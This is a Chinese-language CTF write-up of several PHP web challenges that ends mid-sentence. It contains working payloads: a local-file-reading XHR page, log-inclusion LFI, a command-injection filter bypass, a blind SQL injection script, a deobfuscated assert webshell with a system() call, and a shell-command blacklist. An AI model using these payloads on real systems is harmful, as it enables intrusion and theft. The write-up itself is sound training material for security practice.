<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;title&gt;test&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;body &#123; background: white; &#125;&lt;/style&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      var xhr = new XMLHttpRequest();</span><br><span class="line">      xhr.onload = function () &#123;</span><br><span class="line">        document.body.innerText = xhr.responseText;</span><br><span class="line">      &#125;;</span><br><span class="line">      xhr.open(&#x27;GET&#x27;, &#x27;file:///flag&#x27;);</span><br><span class="line">      xhr.send();</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>让服务器访问这个就行</p>
<h2 id="ALL-INFO-U-WANT"><a href="#ALL-INFO-U-WANT" class="headerlink" title="ALL_INFO_U_WANT"></a>ALL_INFO_U_WANT</h2><p>很流畅的一道题</p>
<p>扫出index.php.bak</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">visit all_info_u_want.php and you will get all information you want</span><br><span class="line"></span><br><span class="line">= =Thinking that it may be difficult, i decided to show you the source code:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">//give you all information you want</span><br><span class="line">if (isset($_GET[&#x27;all_info_i_want&#x27;])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#x27;file&#x27;])) &#123;</span><br><span class="line">    $file = &quot;/var/www/html/&quot; . $_GET[&#x27;file&#x27;];</span><br><span class="line">    //really baby include</span><br><span class="line">    include($file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">really really really baby challenge right? </span><br></pre></td></tr></table></figure>

<p>include日志包含就行</p>
<p>但是real flag不在根目录，要在蚁剑shell找一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find /etc -name &#x27;*&#x27; | xargs grep &quot;&#123;&quot;</span><br><span class="line">或者</span><br><span class="line">find /etc | xargs grep &quot;&#123;&quot;</span><br></pre></td></tr></table></figure>

<p>（只能用单引号，其他都报错 难绷</p>
<h2 id="WUSTCT-朴实无华-Revenge"><a href="#WUSTCT-朴实无华-Revenge" class="headerlink" title="WUSTCT_朴实无华_Revenge"></a>WUSTCT_朴实无华_Revenge</h2><p>进去就是经典闯关，先给一个判断回文的函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function isPalindrome($str)&#123;</span><br><span class="line">    $len=strlen($str);</span><br><span class="line">    $l=1;</span><br><span class="line">    $k=intval($len/2)+1;</span><br><span class="line">    for($j=0;$j&lt;$k;$j++)</span><br><span class="line">        if (substr($str,$j,1)!=substr($str,$len-$j-1,1)) &#123;</span><br><span class="line">            $l=0;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    if ($l==1) return true;</span><br><span class="line">    else return false;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>level1</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    if (preg_match(&#x27;/[^0-9.-]/&#x27;, $num)) &#123;</span><br><span class="line">        die(&quot;非洲欢迎你1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if ($numPositve &lt;= -999999999999999999 || $numPositve &gt;= 999999999999999999) &#123; //在64位系统中 intval()的上限不是2147483647 省省吧</span><br><span class="line">        die(&quot;非洲欢迎你2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就是传入num，经过intval和反向再intval后相等，且原始num不是回文</p>
<p>限定0-9.-</p>
<p>intval是转int的一个函数，会将浮点取整，字符取开头数字</p>
<p>有了提示的.-很容易想到一个payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?num=1.10</span><br><span class="line">intval-&gt;1;strrev-&gt;01.1-&gt;intval-&gt;1;非回文</span><br></pre></td></tr></table></figure>

<p>level2</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;md5&#x27;]))&#123;</span><br><span class="line">    $md5=$_GET[&#x27;md5&#x27;];</span><br><span class="line">    if ($md5==md5(md5($md5)))</span><br><span class="line">        echo &quot;想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.&lt;/br&gt;&quot;;</span><br><span class="line">    else</span><br><span class="line">        die(&quot;我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>双重md5之后相等，明显要求md5绕过，找到两次md5之后都是0e开头即可</p>
<p>0e开头弱比较会认为是科学计数法，0的n次方等于0的m次方</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line">def md5_hash(s):</span><br><span class="line">    return hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">for i in range(1000000000001):</span><br><span class="line">    original_str = &quot;0e&quot; + str(i)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    first_hash = md5_hash(original_str)</span><br><span class="line">    second_hash = md5_hash(first_hash)</span><br><span class="line">    </span><br><span class="line">    if second_hash.startswith(&quot;0e&quot;) and second_hash[2:].isdigit():</span><br><span class="line">        print(original_str)</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?md5=0e3900184182</span><br></pre></td></tr></table></figure>

<p>level3</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;get_flag&#x27;]))&#123;</span><br><span class="line">    $get_flag = $_GET[&#x27;get_flag&#x27;];</span><br><span class="line">    if(!strstr($get_flag,&quot; &quot;))&#123;</span><br><span class="line">        $get_flag = str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        $get_flag = str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag);</span><br><span class="line">        echo &quot;想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.&lt;/br&gt;&quot;;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;快到非洲了&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最简单的一集，不能有空格，不能有上面的关键词</p>
<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2023/04/14/ctf%e9%87%8c%e8%af%bb%e5%8f%96%e6%96%87%e4%bb%b6%e7%9b%b8%e5%85%b3%e7%9f%a5%e8%af%86%e7%82%b9%e6%80%bb%e7%bb%93/">ctf里读取文件相关知识点总结</a></p>
<p>空格可以用&lt;或者制表符(Tab)代替，读取直接nl</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?get_flag=nl&lt;/flag</span><br><span class="line">?get_flag=nl	/flag</span><br></pre></td></tr></table></figure>

<h2 id="Login-Only-For-36D"><a href="#Login-Only-For-36D" class="headerlink" title="Login_Only_For_36D"></a>Login_Only_For_36D</h2><p>F12提示</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402062107206.png" alt="image-20240206210743134"></p>
<p>name参数里必须带admin，fuzz之后被ban了挺多</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#x27;&amp;&#x27;, &quot;&#x27;&quot;, &#x27;-&#x27;, &#x27;;&#x27;, &#x27;&lt;&#x27;, &#x27;=&#x27;, &#x27;&gt;&#x27;, &#x27;|&#x27;, &#x27; &#x27;, &#x27;select&#x27;, &#x27;union&#x27;, &#x27;updatexml&#x27;, &#x27;floor&#x27;, &#x27;rand&#x27;, &#x27;substr&#x27;, &#x27;mid&#x27;, &#x27;ascii&#x27;, &#x27;and&#x27;, &#x27;||&#x27;, &#x27;&amp;&amp;&#x27;]</span><br></pre></td></tr></table></figure>

<p>可以利用<code>/</code>，将admin后面的<code>&#39;</code>注释掉，达到这样的效果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=1\&amp;pass=test</span><br><span class="line">-&gt;</span><br><span class="line">select * from 36d_user where username=&#x27;1\&#x27; and password=&#x27;test&#x27;;</span><br></pre></td></tr></table></figure>

<p>传入数据库查询的username即为<code>1\&#39; and password=</code>，由于无回显，盲注即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://9420c6ec-8845-43b4-b94f-e1aa0543c453.challenge.ctf.show/index.php&quot;</span><br><span class="line">username = &quot;admin\\&quot;</span><br><span class="line">alphabet = [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;, &#x27;e&#x27;, &#x27;f&#x27;, &#x27;j&#x27;, &#x27;h&#x27;, &#x27;i&#x27;, &#x27;g&#x27;, &#x27;k&#x27;, &#x27;l&#x27;, &#x27;m&#x27;, &#x27;n&#x27;, &#x27;o&#x27;, &#x27;p&#x27;, &#x27;q&#x27;, &#x27;r&#x27;, &#x27;s&#x27;, &#x27;t&#x27;, &#x27;u&#x27;,</span><br><span class="line">            &#x27;v&#x27;, &#x27;w&#x27;, &#x27;x&#x27;, &#x27;y&#x27;, &#x27;z&#x27;, &#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;, &#x27;G&#x27;, &#x27;H&#x27;, &#x27;I&#x27;, &#x27;G&#x27;, &#x27;K&#x27;, &#x27;L&#x27;, &#x27;M&#x27;, &#x27;N&#x27;, &#x27;O&#x27;, &#x27;P&#x27;,</span><br><span class="line">            &#x27;Q&#x27;, &#x27;R&#x27;, &#x27;S&#x27;, &#x27;T&#x27;, &#x27;U&#x27;, &#x27;V&#x27;, &#x27;W&#x27;, &#x27;X&#x27;, &#x27;Y&#x27;, &#x27;Z&#x27;, &#x27;0&#x27;, &#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;, &#x27;5&#x27;, &#x27;6&#x27;, &#x27;7&#x27;, &#x27;8&#x27;, &#x27;9&#x27;]</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1, 30):</span><br><span class="line">    for al in alphabet:</span><br><span class="line">        a_int = ord(al)</span><br><span class="line">        data = &#123;</span><br><span class="line">            &#x27;username&#x27;: username,</span><br><span class="line">            &#x27;password&#x27;: f&quot;or/**/if((ord(right(left(password,&#123;i&#125;),1))/**/in/**/(&#123;a_int&#125;)),sleep(3),1)#&quot;</span><br><span class="line">        &#125;</span><br><span class="line">        try:</span><br><span class="line">            r = requests.post(url, data=data, timeout=3)</span><br><span class="line">        except:</span><br><span class="line">            flag += chr(a_int)</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure>

<h2 id="你取吧"><a href="#你取吧" class="headerlink" title="你取吧"></a>你取吧</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$hint=file_get_contents(&#x27;php://filter/read=convert.base64-encode/resource=hhh.php&#x27;);</span><br><span class="line">$code=$_REQUEST[&#x27;code&#x27;];</span><br><span class="line">$_=array(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;l&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;\~&#x27;,&#x27;\^&#x27;);</span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line">foreach ($blacklist as $blacklisted) &#123;</span><br><span class="line">    if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/im&#x27;, $code)) &#123;</span><br><span class="line">        die(&#x27;nonono&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">eval(&quot;echo($code);&quot;);</span><br></pre></td></tr></table></figure>

<p>要求不使用字母取反异或echo出东西，解法很多</p>
<p>预期解是访问<code>$_</code>中的键值拼接，最后用<code>$&#123;&#125;</code>构成$hint</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$&#123;$_&#123;7&#125;.$_&#123;8&#125;.$_&#123;12&#125;.$_&#123;19&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>还有P牛的无数字webshell也能打</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇</a></p>
<p>拿到zip源码，经过phpjiami跑过一遍</p>
<p>还是P牛</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html">phpjiami 数种解密方法</a></p>
<p>hook eval的插件没成功，dump出来的</p>
<p><img src="https://raw.githubusercontent.com/b1xcy/img/master/202402071522756.png" alt="image-20240207152255636"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?&gt;&lt;?php @eval(&quot;//Encode by  phpjiami.com,Free user.&quot;); ?&gt;&lt;?php</span><br><span class="line">$ch = explode(&quot;.&quot;,&quot;hello.ass.world.er.rt.e.saucerman&quot;);</span><br><span class="line">$c = $ch[1].$ch[5].$ch[4]; </span><br><span class="line">@$c($_POST[7-1]);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php </span><br></pre></td></tr></table></figure>

<p>就是<code>assert($_POST[7-1]);)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">6=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>

<p>网上还抄了个解密脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function decrypt($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $data_1 = &#x27;&#x27;;</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $ch = ord($data[$i]);</span><br><span class="line">        if ($ch &lt; 245) &#123;</span><br><span class="line">            if ($ch &gt; 136) &#123;</span><br><span class="line">                $data_1 .= chr($ch / 2);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $data_1 .= $data[$i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_1 = base64_decode($data_1);</span><br><span class="line">    $key = md5($key);</span><br><span class="line">    $j = $ctrmax = 32;</span><br><span class="line">    $data_2 = &#x27;&#x27;;</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data_1); $i++) &#123;</span><br><span class="line">        if ($j &lt;= 0) &#123;</span><br><span class="line">            $j = $ctrmax;</span><br><span class="line">        &#125;</span><br><span class="line">        $j--;</span><br><span class="line">        $data_2 .=  $data_1[$i] ^ $key[$j];</span><br><span class="line">    &#125;</span><br><span class="line">    return $data_2;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function find_data($code)</span><br><span class="line">&#123;</span><br><span class="line">    $code_end = strrpos($code, &#x27;?&gt;&#x27;);</span><br><span class="line">    if (!$code_end) &#123;</span><br><span class="line">        return &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $data_start = $code_end + 2;</span><br><span class="line">    $data = substr($code, $data_start, -46);</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function find_key($code)</span><br><span class="line">&#123;</span><br><span class="line">    // $v1 = $v2(&#x27;bWQ1&#x27;);</span><br><span class="line">    // $key1 = $v1(&#x27;??????&#x27;);</span><br><span class="line">    $pos1 = strpos($code, &quot;(&#x27;&quot; . preg_quote(base64_encode(&#x27;md5&#x27;)) . &quot;&#x27;);&quot;);</span><br><span class="line">    $pos2 = strrpos(substr($code, 0, $pos1), &#x27;$&#x27;);</span><br><span class="line">    $pos3 = strrpos(substr($code, 0, $pos2), &#x27;$&#x27;);</span><br><span class="line">    $var_name = substr($code, $pos3, $pos2 - $pos3 - 1);</span><br><span class="line">    $pos4 = strpos($code, $var_name, $pos1);</span><br><span class="line">    $pos5 = strpos($code, &quot;(&#x27;&quot;, $pos4);</span><br><span class="line">    $pos6 = strpos($code, &quot;&#x27;)&quot;, $pos4);</span><br><span class="line">    $key = substr($code, $pos5 + 2, $pos6 - $pos5 - 2);</span><br><span class="line">    return $key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$input_file = $argv[1];</span><br><span class="line">$output_file = $argv[1] . &#x27;.decrypted.php&#x27;;</span><br><span class="line"></span><br><span class="line">$code = file_get_contents($input_file);</span><br><span class="line"></span><br><span class="line">$data = find_data($code);</span><br><span class="line">if (!$code) &#123;</span><br><span class="line">    echo &#x27;未找到加密数据&#x27;, PHP_EOL;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = find_key($code);</span><br><span class="line">if (!$key) &#123;</span><br><span class="line">    echo &#x27;未找到秘钥&#x27;, PHP_EOL;</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$decrypted = decrypt($data, $key);</span><br><span class="line">$uncompressed = gzuncompress($decrypted);</span><br><span class="line">// 由于可以不勾选代码压缩的选项，所以这里判断一下是否解压成功，解压失败就是没压缩</span><br><span class="line">if ($uncompressed) &#123;</span><br><span class="line">    $decrypted = str_rot13($uncompressed);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $decrypted = str_rot13($decrypted);</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($output_file, $decrypted);</span><br><span class="line">echo &#x27;解密后文件已写入到 &#x27;, $output_file, PHP_EOL;</span><br></pre></td></tr></table></figure>

<h2 id="WUSTCTF-朴实无华-Revenge-Revenge"><a href="#WUSTCTF-朴实无华-Revenge-Revenge" class="headerlink" title="WUSTCTF_朴实无华_Revenge_Revenge"></a>WUSTCTF_朴实无华_Revenge_Revenge</h2><p>只有level1和getflag改了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#x27;num&#x27;]))&#123;</span><br><span class="line">    $num = $_GET[&#x27;num&#x27;];</span><br><span class="line">    $numPositve = intval($num);</span><br><span class="line">    $numReverse = intval(strrev($num));</span><br><span class="line">    if (preg_match(&#x27;/[^0-9.]/&#x27;, $num)) &#123;</span><br><span class="line">        die(&quot;非洲欢迎你1&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        if ( (preg_match_all(&quot;/\./&quot;, $num) &gt; 1) || (preg_match_all(&quot;/\-/&quot;, $num) &gt; 1) || (preg_match_all(&quot;/\-/&quot;, $num)==1 &amp;&amp; !preg_match(&#x27;/^[-]/&#x27;, $num))) &#123;</span><br><span class="line">            die(&quot;没有这样的数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if ($num != $numPositve) &#123;</span><br><span class="line">        die(&#x27;最开始上题时候忘写了这个，导致这level 1变成了弱智，怪不得这么多人solve&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($numPositve &lt;= -999999999999999999 || $numPositve &gt;= 999999999999999999) &#123; //在64位系统中 intval()的上限不是2147483647 省省吧</span><br><span class="line">        die(&quot;非洲欢迎你2&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123;</span><br><span class="line">        echo &quot;我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.&lt;/br&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;金钱解决不了穷人的本质问题&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    die(&quot;去非洲吧&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只允许<code>0-9.</code>还加了<code>$num != $numPositve</code>就是要传入的<code>num</code>和intval处理后的<code>num</code>相等，</p>
<p>利用php浮点精度</p>
<blockquote>
